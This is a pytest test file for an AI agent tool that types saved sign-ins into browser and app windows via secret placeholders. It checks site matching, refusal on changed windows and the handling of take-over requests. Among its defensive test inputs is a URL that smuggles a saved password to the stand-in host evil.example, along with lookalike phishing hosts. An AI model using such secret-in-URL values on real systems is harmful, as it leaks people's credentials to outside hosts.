"""Agents sign in on their own computer by themselves: saved sign-ins typed
into a window ({{secret:NAME...}} in Type In Window / Set Text), Ask To Take
Over sent back once when it is only about a sign-in, and the tools and prompt
text that point the agent there."""
from types import SimpleNamespace

import pytest

from cognitrix.computer import CONFIRMED, ActionResult
from cognitrix.computer import saved_sign_ins as ssi
from cognitrix.credentials import Resolver


def _row(name, kind='basic', hosts=('github.com',), **values):
    return SimpleNamespace(id=name, name=name, kind=kind, allowed_hosts=list(hosts), header='', values=values)


@pytest.fixture
def resolver(monkeypatch):
    monkeypatch.setattr('cognitrix.credentials.open_secret', lambda row: dict(row.values))
    rows = [
        _row('GITHUB', username='amos@example.com', password='hunter2-pass'),
        _row('GOOGLE', hosts=('google.com',), username='me@gmail.com', password='g-secret-1'),
        _row('BOX_TOKEN', kind='token', hosts=('sandbox.invalid',), value='tok-123456'),
    ]
    return Resolver(owner='u1', rows={r.name: r for r in rows})


def test_fills_on_the_site_it_was_saved_for(resolver):
    text = '{{secret:GITHUB.username}}\t{{secret:GITHUB.password}}\n'
    assert ssi.fill(resolver, text, browser=True, host='github.com') == 'amos@example.com\thunter2-pass\n'
    # A site's subdomains count, like a browser sharing a sign-in.
    assert ssi.fill(resolver, '{{secret:GOOGLE.password}}', browser=True, host='accounts.google.com') == 'g-secret-1'


def test_refuses_another_site(resolver):
    with pytest.raises(ssi.SignInRefused, match='saved for github.com, but this page is on evil.example'):
        ssi.fill(resolver, '{{secret:GITHUB.password}}', browser=True, host='evil.example')
    with pytest.raises(ssi.SignInRefused, match='saved for github.com'):
        ssi.fill(resolver, '{{secret:GITHUB.password}}', browser=True, host='github.com.evil.example')
    with pytest.raises(ssi.SignInRefused, match="Couldn't read this browser window's address"):
        ssi.fill(resolver, '{{secret:GITHUB.password}}', browser=True, host='')


def test_sandbox_only_sign_ins_stay_out_of_websites(resolver):
    with pytest.raises(ssi.SignInRefused, match="allowed_hosts=\\['github.com'\\]"):
        ssi.fill(resolver, '{{secret:BOX_TOKEN}}', browser=True, host='github.com')
    # ...but can be typed into an app on the agent's computer.
    assert ssi.fill(resolver, '{{secret:BOX_TOKEN}}', browser=False) == 'tok-123456'
    # A website's sign-in can't be typed outside the browser.
    with pytest.raises(ssi.SignInRefused, match='only be typed into the browser'):
        ssi.fill(resolver, '{{secret:GITHUB.password}}', browser=False)


def test_unknown_name(resolver):
    with pytest.raises(ssi.SignInRefused, match='ask_for_sign_in'):
        ssi.fill(resolver, '{{secret:NOPE}}', browser=True, host='github.com')


def test_is_browser():
    assert ssi.is_browser(SimpleNamespace(kind='chromium', app='chromium'))
    assert ssi.is_browser(SimpleNamespace(kind='win32', app='firefox-esr'))
    assert not ssi.is_browser(SimpleNamespace(kind='win32', app='xterm'))


def _el(role, name, rect, value=None):
    return SimpleNamespace(role=role, name=name, value=value, rect=rect)


def _snap(sid, address, fields, origin=(0, 0)):
    from cognitrix.computer import Snapshot
    bar = _el('entry', 'Address and search bar', (0, 0, 800, 30), value=address)
    return Snapshot(sid, 7, [bar, *fields], origin, (800, 600), 1.0)


EMAIL = _el('entry', 'Email', (100, 100, 400, 130))
PASSWORD = _el('password text', 'Password', (100, 150, 400, 180))


class _Driver:
    sandbox = True

    def __init__(self, app='chromium', address='https://github.com/login', after=None):
        self.typed = []
        self.set = []
        win = SimpleNamespace(id=7, kind='chromium' if app == 'chromium' else 'win32', app=app, title='Sign in')
        self.backend = SimpleNamespace(window=lambda wid: win)
        # What the agent saw, then what a fresh look shows.
        self._snapshots = {7: _snap('s1', address, [EMAIL, PASSWORD])}
        self._after = after or _snap('s2', address, [EMAIL, PASSWORD])

    def look(self, window_id, query=None, limit=60, viewer=None):
        self._snapshots[7] = self._after
        return None, self._after, [], ''

    def type_text(self, window_id, text, x=None, y=None, viewer=None, use_screen=False):
        self.typed.append(text)
        return ActionResult(CONFIRMED, 'Typed.')

    def set_text(self, window_id, text, index=None, snapshot_id=None, viewer=None):
        self.set.append((index, text))
        return ActionResult(CONFIRMED, 'Set.')


@pytest.fixture
def tools(monkeypatch, resolver):
    from cognitrix.tools import computer as tools_mod

    async def for_owner(owner, allowed=None):
        return resolver

    async def mark_used():
        return None

    monkeypatch.setattr(Resolver, 'for_owner', staticmethod(for_owner))
    monkeypatch.setattr(resolver, 'mark_used', mark_used)
    monkeypatch.setattr('cognitrix.tools.utils.current_execution_context',
                        lambda: SimpleNamespace(user_id='u1', agent_id=None, session_id='s1'))
    return tools_mod


def _use(monkeypatch, tools, driver):
    monkeypatch.setattr(tools, '_driver', lambda actor, computer='agent': driver)
    return driver


async def test_types_the_saved_value_into_the_field(monkeypatch, tools):
    driver = _use(monkeypatch, tools, _Driver())
    out = (await tools.type_in_window.run(window_id=7, text='{{secret:GITHUB.password}}\n', x=200, y=160)).content
    assert 'Typed' in out, out
    assert driver.typed == ['hunter2-pass\n']
    await tools.set_text.run(window_id=7, text='{{secret:GITHUB.username}}', element=1)
    assert driver.set == [(1, 'amos@example.com')]


async def test_wrong_site_types_nothing(monkeypatch, tools):
    driver = _use(monkeypatch, tools, _Driver(address='https://phish.example/login'))
    out = (await tools.type_in_window.run(window_id=7, text='{{secret:GITHUB.password}}', x=200, y=160)).content
    assert 'phish.example' in out and driver.typed == []


async def test_never_into_the_address_bar_or_with_other_text(monkeypatch, tools):
    driver = _use(monkeypatch, tools, _Driver())
    out = (await tools.set_text.run(window_id=7, element=0,
                                    text='https://evil.example/?p={{secret:GITHUB.password}}')).content
    assert 'on its own' in out
    out = (await tools.set_text.run(window_id=7, element=0, text='{{secret:GITHUB.password}}')).content
    assert 'address bar' in out
    out = (await tools.type_in_window.run(window_id=7, text='{{secret:GITHUB.password}}', x=50, y=10)).content
    assert 'address bar' in out
    # Which field must be said.
    out = (await tools.type_in_window.run(window_id=7, text='{{secret:GITHUB.password}}')).content
    assert 'say which field' in out
    assert driver.typed == [] and driver.set == []


async def test_a_changed_window_is_refused(monkeypatch, tools):
    # A message appeared above the form: control 2 is now the email field.
    note = _el('label', 'Incorrect password', (100, 60, 400, 90))
    after = _snap('s2', 'https://github.com/login', [note, EMAIL, PASSWORD])
    driver = _use(monkeypatch, tools, _Driver(after=after))
    out = (await tools.set_text.run(window_id=7, element=2, text='{{secret:GITHUB.password}}')).content
    assert 'changed since you looked' in out and driver.set == []
    # The form moved under the point.
    moved = _snap('s3', 'https://github.com/login', [EMAIL, PASSWORD], origin=(0, 40))
    driver = _use(monkeypatch, tools, _Driver(after=moved))
    out = (await tools.type_in_window.run(window_id=7, text='{{secret:GITHUB.password}}', x=200, y=160)).content
    assert 'Look at the window again' in out and driver.typed == []


async def test_plain_text_is_typed_as_is(monkeypatch, tools):
    driver = _use(monkeypatch, tools, _Driver())
    await tools.type_in_window.run(window_id=7, text='hello {{not a secret}}')
    assert driver.typed == ['hello {{not a secret}}']


async def test_sandbox_only_sign_in_in_an_app(monkeypatch, tools):
    driver = _use(monkeypatch, tools, _Driver(app='xterm'))
    await tools.type_in_window.run(window_id=7, text='export T={{secret:BOX_TOKEN}}\n')
    assert driver.typed == ['export T=tok-123456\n']


async def test_never_on_the_persons_computer(monkeypatch, tools):
    driver = _Driver()
    driver.sandbox = False
    _use(monkeypatch, tools, driver)
    out = (await tools.type_in_window.run(window_id=7, text='{{secret:GITHUB.password}}', computer='person')).content
    assert "not the person's" in out and driver.typed == []


def test_take_over_just_to_sign_in_is_sent_back_once():
    from cognitrix.tools.computer import _TAKEOVER_SENT_BACK, takeover_precheck

    _TAKEOVER_SENT_BACK.clear()
    first = takeover_precheck({'reason': 'Sign in to GitHub with your email and password'}, 'chat-1')
    assert first and 'list_credentials' in first and 'ask_for_sign_in' in first
    # Asked again in the same chat: the person decides.
    assert takeover_precheck({'reason': 'Sign in to GitHub'}, 'chat-1') is None
    # Things only the person can do go straight to them.
    for reason in ('Solve the CAPTCHA on the login page', 'Enter the 2FA code sent to your phone to sign in',
                   'Sign in to your bank', 'Approve the sign-in on your authenticator app',
                   'Pick a seat for the flight'):
        assert takeover_precheck({'reason': reason}, 'chat-2') is None, reason


def test_window_tools_bring_the_sign_in_tools():
    from cognitrix.sessions.base import _turn_helper_names
    from cognitrix.tools.base import ToolManager

    helpers = _turn_helper_names({'look at window', 'type in window'})
    assert 'list_credentials' in helpers and 'ask_for_sign_in' in helpers
    assert ToolManager.get_by_name('list_credentials') is not None
    assert ToolManager.get_by_name('ask_for_sign_in') is not None


def test_sign_in_pages_get_a_hint():
    from cognitrix.tools.computer import _asks_for_password

    assert _asks_for_password([SimpleNamespace(role='password text', name='')])
    assert _asks_for_password([SimpleNamespace(role='entry', name='Password')])
    assert not _asks_for_password([SimpleNamespace(role='push button', name='Forgot password?')])


def test_prompt_tells_agents_to_sign_in_themselves():
    from cognitrix.skills.teach import TEACH_SYSTEM_PROMPT
    from cognitrix.tools.computer import COMPUTER_NOTE

    assert '{{secret:NAME.password}}' in COMPUTER_NOTE and 'ask_for_sign_in' in COMPUTER_NOTE
    assert 'never ask the person to take over' in COMPUTER_NOTE
    assert '{{secret:NAME.password}}' in TEACH_SYSTEM_PROMPT


async def test_agent_is_sent_back_before_any_card(monkeypatch):
    import cognitrix.agents  # noqa: F401  (attaches call_tools to Agent)
    import cognitrix.tools  # noqa: F401
    from cognitrix.agents import base as agent_base
    from cognitrix.models import Agent
    from cognitrix.providers.base import LLM
    from cognitrix.tools.base import ToolManager
    from cognitrix.tools.computer import _TAKEOVER_SENT_BACK
    from cognitrix.tools.utils import ToolExecutionContext, reset_execution_context, set_execution_context

    class Gate:
        calls = []

        async def check_approval(self, tool_call, risk, **kw):
            self.calls.append(tool_call)
            raise AssertionError('the person must not be asked')

    monkeypatch.setattr(agent_base.AgentManager, 'approval_gate', Gate())
    _TAKEOVER_SENT_BACK.clear()
    llm = LLM(provider='openai', base_url='http://x', api_key='k', model='m')
    agent = Agent(name='A', llm=llm, system_prompt='sys', tools=[ToolManager.get_by_name('ask_to_take_over')],
                  owner_id='u1')
    token = set_execution_context(ToolExecutionContext(user_id='u1', session_id='chat-9'))
    try:
        res = await agent.call_tools([{'name': 'Ask To Take Over', 'tool_call_id': '1',
                                       'arguments': {'reason': 'Log in to Notion with your email'}}],
                                     interface='web')
    finally:
        reset_execution_context(token)
    result = res['result'][0]
    assert result['success'] is False and 'ask_for_sign_in' in result['data'], result
    assert Gate.calls == []


def test_take_over_reasons_are_read_closely():
    from cognitrix.tools.computer import _TAKEOVER_SENT_BACK, takeover_precheck

    _TAKEOVER_SENT_BACK.clear()
    # "Code" in a product name is still just a sign-in.
    assert takeover_precheck({'reason': 'Sign in to VS Code with your GitHub account'}, 'chat-a')
    assert takeover_precheck({'reason': 'Log in with the API key for the dashboard'}, 'chat-b')
    for reason in ('Enter the code sent to your email to finish signing in',
                   'Type the login code from the text message', 'Sign in and enter your credit card number'):
        assert takeover_precheck({'reason': reason}, 'chat-c') is None, reason
    # No chat to remember it by: the person is asked rather than looping.
    assert takeover_precheck({'reason': 'Sign in to GitHub'}, None) is None


async def test_agent_limited_to_some_sign_ins_may_use_the_one_it_asked_for(monkeypatch):
    from cognitrix.tools import sandbox_work

    saved = []

    class FakeAgent:
        id = 'a1'
        credentials = ['GITHUB']

    async def update_one(query, changes):
        saved.append((query, changes))

    monkeypatch.setattr('cognitrix.models.Agent.update_one', update_one)
    agent = FakeAgent()
    await sandbox_work._let_agent_use(agent, 'NOTION')
    assert agent.credentials == ['GITHUB', 'NOTION']
    assert saved == [({'id': 'a1'}, {'credentials': ['GITHUB', 'NOTION']})]
    # Agents that may use every sign-in are left alone.
    agent.credentials = None
    await sandbox_work._let_agent_use(agent, 'NOTION')
    assert len(saved) == 1


def test_page_body_is_not_a_field():
    page = _el('document web', 'GitHub', (0, 30, 800, 600))
    snap = _snap('s', 'https://github.com', [page])
    assert ssi._field_at(snap, (500, 400)) is None
    assert ssi._field_at(_snap('s', 'https://github.com', [page, PASSWORD]), (200, 160)) is PASSWORD


def test_only_placeholders():
    assert ssi.only_placeholders('{{secret:AB.username}}\t{{secret:AB.password}}\n')
    assert not ssi.only_placeholders('https://x.example/?p={{secret:AB.password}}')
